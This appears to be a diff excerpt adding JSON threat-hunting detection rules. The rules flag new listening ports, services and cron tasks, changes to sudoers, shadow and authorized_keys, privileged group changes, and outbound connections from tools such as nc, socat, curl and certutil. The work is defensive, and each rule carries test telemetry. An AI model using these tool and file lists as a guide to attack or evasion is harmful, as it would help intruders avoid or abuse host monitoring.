+          "count": 1
+        },
+        {
+          "name": "create without privilege",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:00:00Z|account_change|newuser|",
+                "attributes": {
+                  "action": "account_change",
+                  "result": "success",
+                  "user": "newuser",
+                  "source_address": null,
+                  "service": "sshd",
+                  "change": "created"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              }
+            ]
+          }
+        },
+        {
+          "name": "different accounts",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "auth_event",
+                "key": "e1|2026-03-01T09:00:00Z|account_change|newuser|",
+                "attributes": {
+                  "action": "account_change",
+                  "result": "success",
+                  "user": "newuser",
+                  "source_address": null,
+                  "service": "sshd",
+                  "change": "created"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              },
+              {
+                "category": "auth_event",
+                "key": "e2|2026-03-01T09:00:05Z|group_change|olduser|",
+                "attributes": {
+                  "action": "group_change",
+                  "result": "success",
+                  "user": "olduser",
+                  "source_address": null,
+                  "service": "sshd",
+                  "change": "member_added",
+                  "group": "sudo"
+                },
+                "event_time": "2026-03-01T09:00:05Z"
+              }
+            ]
+          }
+        }
+      ],
+      "require": {
+        "all": [
+          "new",
+          "grp"
+        ]
+      }
+    },
+    {
+      "id": "DR-ANY-HCHG-001",
+      "version": "1.0.0",
+      "name": "New listening port since the previous telemetry snapshot",
+      "description": "A listener on a non-loopback address appears that was not present in the earlier telemetry.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-change",
+      "severity": "medium",
+      "severity_reason": "A new inbound-reachable service is a change in attack surface and possibly a backdoor.",
+      "confidence": "medium",
+      "confidence_reason": "Both snapshots completely covered listeners, so the new listener is a real difference; its purpose is unknown.",
+      "nature": "observation",
+      "requires_coverage": [
+        "telemetry:listener"
+      ],
+      "clauses": [
+        {
+          "id": "new",
+          "source": "telemetry_changes",
+          "description": "A listener added since the baseline",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "listener"
+              },
+              {
+                "field": "change",
+                "op": "eq",
+                "value": "added"
+              },
+              {
+                "field": "determinate",
+                "op": "is_true"
+              },
+              {
+                "not": {
+                  "any": [
+                    {
+                      "field": "attrs.local_address",
+                      "op": "regex",
+                      "value": "^127\\."
+                    },
+                    {
+                      "field": "attrs.local_address",
+                      "op": "in",
+                      "value": [
+                        "::1",
+                        "[::1]",
+                        "localhost"
+                      ]
+                    }
+                  ]
+                }
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "New listener on port {new.attrs.local_port} ({new.attrs.process})",
+      "rationale": "A listening port that was not there before is a difference in how the host can be reached. It is reported as an observation because planned deployments do exactly this.",
+      "false_positives": [
+        "A planned service deployment or upgrade."
+      ],
+      "confidence_boosters": [
+        "The owning process is in a temporary location (DR-ANY-HNET-001)."
+      ],
+      "investigation": [
+        "Find the owning process and how it started.",
+        "Check change records for a deployment.",
+        "Check whether the port is reachable from untrusted networks."
+      ],
+      "remediation": "If unplanned, investigate the process and restrict access per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1571",
+            "relationship": "possible",
+            "explanation": "A new port can be a non-standard communication channel; this shows only that it appeared."
+          }
+        ],
+        "nist": [
+          "CM-3",
+          "CM-8",
+          "SC-7"
+        ]
+      },
+      "examples": [
+        {
+          "name": "new listener",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "listener",
+                "key": "l1",
+                "attributes": {
+                  "protocol": "tcp",
+                  "local_address": "0.0.0.0",
+                  "local_port": 9001,
+                  "process": "x"
+                }
+              },
+              {
+                "category": "listener",
+                "key": "l2",
+                "attributes": {
+                  "protocol": "tcp",
+                  "local_address": "0.0.0.0",
+                  "local_port": 22,
+                  "process": "sshd"
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "listener",
+                "key": "l2",
+                "attributes": {
+                  "protocol": "tcp",
+                  "local_address": "0.0.0.0",
+                  "local_port": 22,
+                  "process": "sshd"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "unchanged",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "listener",
+                "key": "l2",
+                "attributes": {
+                  "protocol": "tcp",
+                  "local_address": "0.0.0.0",
+                  "local_port": 22,
+                  "process": "sshd"
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "listener",
+                "key": "l2",
+                "attributes": {
+                  "protocol": "tcp",
+                  "local_address": "0.0.0.0",
+                  "local_port": 22,
+                  "process": "sshd"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "baseline listeners were not collected",
+          "expect": "indeterminate",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "listener",
+                "key": "l1",
+                "attributes": {
+                  "protocol": "tcp",
+                  "local_address": "0.0.0.0",
+                  "local_port": 9001,
+                  "process": "x"
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [],
+            "coverage": {
+              "listener": "unavailable"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HCHG-002",
+      "version": "1.0.0",
+      "name": "New service since the previous telemetry snapshot",
+      "description": "A service exists that was not in the earlier telemetry.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-change",
+      "severity": "low",
+      "severity_reason": "New automatic execution is a change worth confirming; most are planned.",
+      "confidence": "medium",
+      "confidence_reason": "Both snapshots completely covered the category, so the addition is real; its purpose is unknown.",
+      "nature": "observation",
+      "requires_coverage": [
+        "telemetry:service"
+      ],
+      "clauses": [
+        {
+          "id": "new",
+          "source": "telemetry_changes",
+          "description": "A service added since the baseline",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "service"
+              },
+              {
+                "field": "change",
+                "op": "eq",
+                "value": "added"
+              },
+              {
+                "field": "determinate",
+                "op": "is_true"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "New service: {new.attrs.name}",
+      "rationale": "Persistence frequently takes the form of a new service or task. Because installations and updates add them routinely, this is reported as an observation to reconcile with change records.",
+      "false_positives": [
+        "Software installation or update."
+      ],
+      "confidence_boosters": [
+        "It runs from a user-writable path (DR-ANY-HSVC-001, DR-ANY-HTSK-002)."
+      ],
+      "investigation": [
+        "Reconcile with change records or deployments.",
+        "Examine the command or binary it runs.",
+        "Check who created it."
+      ],
+      "remediation": "If unplanned, investigate before any change per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1053",
+            "relationship": "possible",
+            "explanation": "New scheduled execution can indicate persistence; this shows only that it appeared."
+          },
+          {
+            "id": "T1543",
+            "relationship": "possible",
+            "explanation": "New services can indicate persistence; this shows only that it appeared."
+          }
+        ],
+        "nist": [
+          "CM-3",
+          "CM-8",
+          "AU-6"
+        ]
+      },
+      "examples": [
+        {
+          "name": "new service",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "service",
+                "key": "s1",
+                "attributes": {
+                  "name": "new.service",
+                  "path": "/usr/bin/new"
+                }
+              },
+              {
+                "category": "service",
+                "key": "s2",
+                "attributes": {
+                  "name": "old.service",
+                  "path": "/usr/bin/old"
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "service",
+                "key": "s2",
+                "attributes": {
+                  "name": "old.service",
+                  "path": "/usr/bin/old"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "same services",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "service",
+                "key": "s2",
+                "attributes": {
+                  "name": "old.service",
+                  "path": "/usr/bin/old"
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "service",
+                "key": "s2",
+                "attributes": {
+                  "name": "old.service",
+                  "path": "/usr/bin/old"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "services unavailable in current",
+          "expect": "indeterminate",
+          "platform": "linux",
+          "telemetry": {
+            "records": [],
+            "coverage": {
+              "service": "unavailable"
+            }
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "service",
+                "key": "s2",
+                "attributes": {
+                  "name": "old.service",
+                  "path": "/usr/bin/old"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HCHG-003",
+      "version": "1.0.0",
+      "name": "Monitored sensitive file changed since the previous telemetry snapshot",
+      "description": "The hash of an account, privilege, SSH, preload or hosts file differs from the earlier snapshot.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-change",
+      "severity": "medium",
+      "severity_reason": "These files control who can log in and with what privileges; unexpected edits are a high-value signal.",
+      "confidence": "medium",
+      "confidence_reason": "The content hash changed between two complete snapshots; the cause is not known.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:integrity"
+      ],
+      "clauses": [
+        {
+          "id": "chg",
+          "source": "telemetry_changes",
+          "description": "A monitored file whose hash changed",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "integrity"
+              },
+              {
+                "field": "change",
+                "op": "eq",
+                "value": "changed"
+              },
+              {
+                "field": "determinate",
+                "op": "is_true"
+              },
+              {
+                "field": "attributes.names",
+                "op": "contains",
+                "value": "sha256"
+              },
+              {
+                "field": "attrs.path",
+                "op": "regex",
+                "value": "(?i)(/etc/(passwd|group|shadow|sudoers|ssh/sshd_config|ld\\.so\\.preload|hosts|crontab|rc\\.local)$|/authorized_keys2?$|\\\\drivers\\\\etc\\\\hosts$)"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "Monitored file changed: {chg.attrs.path}",
+      "rationale": "A change to passwd, sudoers, sshd_config, authorized_keys, ld.so.preload or hosts changes who can access the host or what runs. Legitimate administration changes them too, so the question is whether this change was planned.",
+      "false_positives": [
+        "Planned account or access administration."
+      ],
+      "confidence_boosters": [
+        "Change coincides with a login from a new source.",
+        "A new account, key or sudo rule appears."
+      ],
+      "investigation": [
+        "Diff the file against the previous copy or a package default.",
+        "Find who changed it (audit logs, shell history, auth events).",
+        "Reconcile with change records."
+      ],
+      "remediation": "If unauthorised, preserve both versions as evidence, then restore from a trusted source per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1098",
+            "relationship": "possible",
+            "explanation": "Changes to account or access configuration can be persistence; intent is not established."
+          },
+          {
+            "id": "T1565.001",
+            "relationship": "possible",
+            "explanation": "Stored data was modified; whether maliciously is not established."
+          }
+        ],
+        "nist": [
+          "CM-3",
+          "SI-7",
+          "AU-6"
+        ]
+      },
+      "examples": [
+        {
+          "name": "sudoers changed",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "integrity",
+                "key": "i1",
+                "attributes": {
+                  "path": "/etc/sudoers",
+                  "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "mode": "440"
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "integrity",
+                "key": "i1",
+                "attributes": {
+                  "path": "/etc/sudoers",
+                  "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+                  "mode": "440"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "sudoers unchanged",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "integrity",
+                "key": "i1",
+                "attributes": {
+                  "path": "/etc/sudoers",
+                  "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+                  "mode": "440"
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "integrity",
+                "key": "i1",
+                "attributes": {
+                  "path": "/etc/sudoers",
+                  "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+                  "mode": "440"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "unmonitored file changed",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "integrity",
+                "key": "i1",
+                "attributes": {
+                  "path": "/etc/motd",
+                  "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "integrity",
+                "key": "i1",
+                "attributes": {
+                  "path": "/etc/motd",
+                  "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HCHG-004",
+      "version": "1.0.0",
+      "name": "Privileged group membership changed since the previous telemetry snapshot",
+      "description": "The member list of an administrative group differs from the earlier snapshot.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-change",
+      "severity": "high",
+      "severity_reason": "Changes to administrative groups change who holds the most powerful rights.",
+      "confidence": "medium",
+      "confidence_reason": "Both snapshots completely covered groups; which member changed is shown in the contributing item.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:group"
+      ],
+      "clauses": [
+        {
+          "id": "grp",
+          "source": "telemetry_changes",
+          "description": "A privileged group whose members changed",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "group"
+              },
+              {
+                "field": "change",
+                "op": "eq",
+                "value": "changed"
+              },
+              {
+                "field": "determinate",
+                "op": "is_true"
+              },
+              {
+                "field": "attributes.names",
+                "op": "contains",
+                "value": "members"
+              },
+              {
+                "field": "attrs.name",
+                "op": "in",
+                "value": [
+                  "sudo",
+                  "wheel",
+                  "admin",
+                  "root",
+                  "adm",
+                  "administrators",
+                  "domain admins",
+                  "remote desktop users",
+                  "Administrators"
+                ]
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "Members of {grp.attrs.name} changed",
+      "rationale": "Membership of sudo, wheel, admin, root or Administrators grants administrative rights. The rule reports that the list changed and shows before/after; it does not judge who was added.",
+      "false_positives": [
+        "Planned privilege grants or removals."
+      ],
+      "confidence_boosters": [
+        "The added account was created recently (DR-ANY-HAUTH-004)."
+      ],
+      "investigation": [
+        "Compare the before/after member lists in the contributing item.",
+        "Reconcile with change records.",
+        "Review the added accounts' recent activity."
+      ],
+      "remediation": "If unauthorised, remove the membership through your normal process after preserving evidence. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1098",
+            "relationship": "possible",
+            "explanation": "Group membership changes can be privilege persistence; intent is not established."
+          }
+        ],
+        "nist": [
+          "AC-2",
+          "AC-6",
+          "AU-6"
+        ]
+      },
+      "examples": [
+        {
+          "name": "sudo gained a member",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "group",
+                "key": "g1",
+                "attributes": {
+                  "name": "sudo",
+                  "members": [
+                    "alice",
+                    "mallory"
+                  ]
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "group",
+                "key": "g1",
+                "attributes": {
+                  "name": "sudo",
+                  "members": [
+                    "alice"
+                  ]
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "sudo unchanged",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "group",
+                "key": "g1",
+                "attributes": {
+                  "name": "sudo",
+                  "members": [
+                    "alice"
+                  ]
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "group",
+                "key": "g1",
+                "attributes": {
+                  "name": "sudo",
+                  "members": [
+                    "alice"
+                  ]
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "non-privileged group changed",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "group",
+                "key": "g1",
+                "attributes": {
+                  "name": "staff",
+                  "members": [
+                    "alice",
+                    "bob"
+                  ]
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "group",
+                "key": "g1",
+                "attributes": {
+                  "name": "staff",
+                  "members": [
+                    "alice"
+                  ]
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HCHG-005",
+      "version": "1.0.0",
+      "name": "New scheduled task since the previous telemetry snapshot",
+      "description": "A scheduled task or cron entry exists that was not in the earlier telemetry.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-change",
+      "severity": "low",
+      "severity_reason": "New automatic execution is a change worth confirming; most are planned.",
+      "confidence": "medium",
+      "confidence_reason": "Both snapshots completely covered the category, so the addition is real; its purpose is unknown.",
+      "nature": "observation",
+      "requires_coverage": [
+        "telemetry:scheduled_task"
+      ],
+      "clauses": [
+        {
+          "id": "new",
+          "source": "telemetry_changes",
+          "description": "A scheduled task added since the baseline",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "scheduled_task"
+              },
+              {
+                "field": "change",
+                "op": "eq",
+                "value": "added"
+              },
+              {
+                "field": "determinate",
+                "op": "is_true"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "New scheduled task: {new.attrs.name}",
+      "rationale": "Persistence frequently takes the form of a new service or task. Because installations and updates add them routinely, this is reported as an observation to reconcile with change records.",
+      "false_positives": [
+        "Software installation or update."
+      ],
+      "confidence_boosters": [
+        "It runs from a user-writable path (DR-ANY-HTSK-001, DR-ANY-HTSK-002)."
+      ],
+      "investigation": [
+        "Reconcile with change records or deployments.",
+        "Examine the command or binary it runs.",
+        "Check who created it."
+      ],
+      "remediation": "If unplanned, investigate before any change per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1053",
+            "relationship": "possible",
+            "explanation": "New scheduled execution can indicate persistence; this shows only that it appeared."
+          },
+          {
+            "id": "T1543",
+            "relationship": "possible",
+            "explanation": "New services can indicate persistence; this shows only that it appeared."
+          }
+        ],
+        "nist": [
+          "CM-3",
+          "CM-8",
+          "AU-6"
+        ]
+      },
+      "examples": [
+        {
+          "name": "new task",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "scheduled_task",
+                "key": "t1",
+                "attributes": {
+                  "name": "/etc/cron.d/new",
+                  "command": "/usr/bin/new"
+                }
+              },
+              {
+                "category": "scheduled_task",
+                "key": "t2",
+                "attributes": {
+                  "name": "/etc/cron.d/old",
+                  "command": "/usr/bin/old"
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "scheduled_task",
+                "key": "t2",
+                "attributes": {
+                  "name": "/etc/cron.d/old",
+                  "command": "/usr/bin/old"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "same tasks",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "scheduled_task",
+                "key": "t2",
+                "attributes": {
+                  "name": "/etc/cron.d/old",
+                  "command": "/usr/bin/old"
+                }
+              }
+            ]
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "scheduled_task",
+                "key": "t2",
+                "attributes": {
+                  "name": "/etc/cron.d/old",
+                  "command": "/usr/bin/old"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "tasks unavailable in current",
+          "expect": "indeterminate",
+          "platform": "linux",
+          "telemetry": {
+            "records": [],
+            "coverage": {
+              "scheduled_task": "unavailable"
+            }
+          },
+          "previous_telemetry": {
+            "records": [
+              {
+                "category": "scheduled_task",
+                "key": "t2",
+                "attributes": {
+                  "name": "/etc/cron.d/old",
+                  "command": "/usr/bin/old"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HNET-001",
+      "version": "1.0.0",
+      "name": "Network listener owned by a process in a temporary location",
+      "description": "A process listening on a non-loopback address runs from a temporary or world-writable directory.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-network",
+      "severity": "high",
+      "severity_reason": "A staged program that accepts connections can be a backdoor or proxy.",
+      "confidence": "medium",
+      "confidence_reason": "Both facts are observed and tied together by process id; test servers run from temp directories too.",
+      "nature": "correlated",
+      "requires_coverage": [
+        "telemetry:process",
+        "telemetry:listener"
+      ],
+      "clauses": [
+        {
+          "id": "lst",
+          "source": "telemetry",
+          "description": "A listener on a non-loopback address",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "listener"
+              },
+              {
+                "not": {
+                  "any": [
+                    {
+                      "field": "attrs.local_address",
+                      "op": "regex",
+                      "value": "^127\\."
+                    },
+                    {
+                      "field": "attrs.local_address",
+                      "op": "in",
+                      "value": [
+                        "::1",
+                        "[::1]",
+                        "localhost"
+                      ]
+                    }
+                  ]
+                }
+              }
+            ]
+          }
+        },
+        {
+          "id": "p",
+          "source": "telemetry",
+          "description": "A process executing from a temporary location",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "process"
+              },
+              {
+                "field": "attrs.exe",
+                "op": "regex",
+                "value": "(?i)^(/tmp/|/var/tmp/|/dev/shm/|/run/shm/)|\\\\(appdata\\\\local\\\\temp|windows\\\\temp|users\\\\public)\\\\"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "attrs.pid"
+      },
+      "title": "{p.attrs.name} listening on port {lst.attrs.local_port} from {p.attrs.exe}",
+      "rationale": "A listening socket and a staged executable that share a process id suggest a program that was dropped and then opened for inbound access. Each observation alone is weak; together they are worth prompt triage.",
+      "false_positives": [
+        "A developer running a test server from a scratch directory.",
+        "Pid reuse between the listener and process collection moments."
+      ],
+      "confidence_boosters": [
+        "Connections from external addresses to the port.",
+        "The executable is deleted or unsigned."
+      ],
+      "investigation": [
+        "Identify the port's expected purpose.",
+        "Check firewall rules that expose the port.",
+        "Hash and examine the executable; review how it arrived.",
+        "Review connections to the port."
+      ],
+      "remediation": "If unauthorised, preserve evidence, then block the port and stop the process per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1090",
+            "relationship": "possible",
+            "explanation": "A listener can be used as a proxy or relay; the data does not show traffic."
+          },
+          {
+            "id": "T1571",
+            "relationship": "possible",
+            "explanation": "A non-standard port may be in use; whether it is an adversary channel is not established."
+          }
+        ],
+        "nist": [
+          "SC-7",
+          "SI-4",
+          "CM-7"
+        ]
+      },
+      "examples": [
+        {
+          "name": "listener from /tmp",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "listener",
+                "key": "l1",
+                "attributes": {
+                  "protocol": "tcp",
+                  "local_address": "0.0.0.0",
+                  "local_port": 8081,
+                  "pid": 70,
+                  "process": "agent"
+                }
+              },
+              {
+                "category": "process",
+                "key": "pid:70",
+                "attributes": {
+                  "pid": 70,
+                  "ppid": 1,
+                  "name": "agent",
+                  "exe": "/tmp/agent",
+                  "user": "www-data",
+                  "cmdline": "agent"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "listener from /usr/sbin",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "listener",
+                "key": "l1",
+                "attributes": {
+                  "protocol": "tcp",
+                  "local_address": "0.0.0.0",
+                  "local_port": 22,
+                  "pid": 70,
+                  "process": "sshd"
+                }
+              },
+              {
+                "category": "process",
+                "key": "pid:70",
+                "attributes": {
+                  "pid": 70,
+                  "ppid": 1,
+                  "name": "sshd",
+                  "exe": "/usr/sbin/sshd",
+                  "user": "root",
+                  "cmdline": "sshd"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "loopback listener from /tmp",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "listener",
+                "key": "l1",
+                "attributes": {
+                  "protocol": "tcp",
+                  "local_address": "127.0.0.1",
+                  "local_port": 8081,
+                  "pid": 70,
+                  "process": "agent"
+                }
+              },
+              {
+                "category": "process",
+                "key": "pid:70",
+                "attributes": {
+                  "pid": 70,
+                  "ppid": 1,
+                  "name": "agent",
+                  "exe": "/tmp/agent",
+                  "user": "root",
+                  "cmdline": "agent"
+                }
+              }
+            ]
+          }
+        }
+      ],
+      "require": {
+        "all": [
+          "lst",
+          "p"
+        ]
+      }
+    },
+    {
+      "id": "DR-ANY-HNET-002",
+      "version": "1.0.0",
+      "name": "Outbound connection from an interpreter or download utility",
+      "description": "A scripting interpreter, shell, or download utility owns an established connection to a non-private address.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-network",
+      "severity": "medium",
+      "severity_reason": "Interpreters and download tools are used to fetch payloads and to tunnel traffic, but they are also everyday tools.",
+      "confidence": "low",
+      "confidence_reason": "Only the process name and remote address are known; the traffic content and purpose are not.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:network_connection"
+      ],
+      "clauses": [
+        {
+          "id": "net",
+          "source": "telemetry",
+          "description": "An established external connection owned by an interpreter or downloader",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "network_connection"
+              },
+              {
+                "field": "attrs.state",
+                "op": "ieq",
+                "value": "established"
+              },
+              {
+                "field": "attrs.process",
+                "op": "in",
+                "value": [
+                  "python",
+                  "python3",
+                  "perl",
+                  "ruby",
+                  "php",
+                  "nc",
+                  "ncat",
+                  "netcat",
+                  "socat",
+                  "curl",
+                  "wget",
+                  "powershell.exe",
+                  "pwsh.exe",
+                  "mshta.exe",
+                  "wscript.exe",
+                  "cscript.exe",
+                  "certutil.exe",
+                  "bitsadmin.exe",
+                  "rundll32.exe",
+                  "regsvr32.exe"
+                ]
+              },
+              {
+                "field": "attrs.remote_address",
+                "op": "present"
+              },
+              {
+                "not": {
+                  "field": "attrs.remote_address",
+                  "op": "regex",
+                  "value": "^(10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|127\\.|169\\.254\\.|::1$|fe80:|f[cd][0-9a-f]{2}:|0\\.0\\.0\\.0$|::$)"
+                }
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "{net.attrs.process} connected to {net.attrs.remote_address}:{net.attrs.remote_port}",
+      "rationale": "Living-off-the-land tooling is chosen because it is already trusted. A connection by such a tool to an external address is a lead to follow up with the process tree, user and timing, not a conclusion.",
+      "false_positives": [
+        "Package updates (curl/wget/pip) and configuration management.",
+        "Administrators downloading files."
+      ],
+      "confidence_boosters": [
+        "Parent is a server or Office process.",
+        "Repeated connections at regular intervals (beaconing)."
+      ],
+      "investigation": [
+        "Find the process and its parent chain.",
+        "Check the remote address and port against expectations.",
+        "Review proxy and DNS logs for the same period."
+      ],
+      "remediation": "If unexplained, capture evidence and restrict egress per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1105",
+            "relationship": "possible",
+            "explanation": "Download utilities can transfer tools; this shows a connection, not a transfer."
+          },
+          {
+            "id": "T1071",
+            "relationship": "possible",
+            "explanation": "An outbound application-layer connection exists; its content is unknown."
+          }
+        ],
+        "nist": [
+          "SC-7",
+          "SI-4"
+        ]
+      },
+      "examples": [
+        {
+          "name": "curl to external host",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "network_connection",
+                "key": "c:80:198.51.100.7:443",
+                "attributes": {
+                  "protocol": "tcp",
+                  "state": "established",
+                  "local_address": "10.0.0.5",
+                  "local_port": 40080,
+                  "remote_address": "198.51.100.7",
+                  "remote_port": 443,
+                  "pid": 80,
+                  "process": "curl"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "curl to internal host",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "network_connection",
+                "key": "c:80:10.1.1.1:443",
+                "attributes": {
+                  "protocol": "tcp",
+                  "state": "established",
+                  "local_address": "10.0.0.5",
+                  "local_port": 40080,
+                  "remote_address": "10.1.1.1",
+                  "remote_port": 443,
+                  "pid": 80,
+                  "process": "curl"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "browser to external host",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "network_connection",
+                "key": "c:80:198.51.100.7:443",
+                "attributes": {
+                  "protocol": "tcp",
+                  "state": "established",
+                  "local_address": "10.0.0.5",
+                  "local_port": 40080,
+                  "remote_address": "198.51.100.7",
+                  "remote_port": 443,
+                  "pid": 80,
+                  "process": "firefox"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HPER-002",
+      "version": "1.0.0",
+      "name": "Autostart entry pointing into a user-writable location",
+      "description": "A Run key, startup item or autostart entry launches a program from a temporary or user-writable directory.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-persistence",
+      "severity": "medium",
